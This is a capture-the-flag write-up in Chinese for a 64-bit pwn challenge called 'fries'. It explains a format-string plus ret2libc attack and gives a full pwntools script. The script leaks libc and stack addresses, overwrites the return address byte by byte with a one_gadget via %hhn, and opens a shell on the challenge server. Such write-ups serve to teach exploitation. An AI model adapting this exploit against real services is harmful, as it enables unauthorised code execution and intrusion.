# fries

## 文件分析

保护全开  
ghidra分析为64位程序

## 逆向

这道题考察格式化字符串+ret2libc，共有8次机会，可以先leak栈地址和libc地址，
再把返回地址写成打开shell，此处使用one_gadget可以只利用一次返回完成攻击

## 踩过的坑

本地能过的脚本，远端换了多少ogg就是不行，最后发现是栈上内容不一样！
下次还是先patchelf把libc打成目标的再本地调试吧（一开始偷懒，本地没patch）

## EXPLOIT

```python
from pwn import *

def payload(lo):
    global sh
    if lo:
        sh = process('./fries')
        if lo & 0b10:
            gdb.attach(sh, gdbscript='b *$rebase(0x1300)')
    else:
        sh = remote('43.249.195.138', 21942)
    oneGadgetOffset = 0xebc85
    libc = ELF('./libc.so.6')

    # payload 1, enter adventure()
    sh.sendline(b'fries\0')

    # payload 2, leak libc and stackAddr
    sh.recvuntil(b'pier\n')
    sh.sendline(b'%15$p%24$p')

    libcBase = int(sh.recv(14), 16) - libc.symbols['_IO_2_1_stdout_']
    ogg = libcBase + oneGadgetOffset
    stackRet = int(sh.recv(14), 16) - 0x48

    # payload 3 ~ 8, make one_gadget on retAddr
    mask = 0xff
    for i in range(6):
        sh.recvuntil(b'pier\n')
        count = (ogg & mask) >> 8 * i
        sh.sendline(f'%{count}c%10$hhn'.ljust(16).encode() + p64(stackRet + i))
        mask <<= 8

    # payload 9, discard remaining 1 read
    sh.recvuntil(b'pier\n')
    sh.sendline(b'just for fun\0')

    sh.interactive()
```

Done.
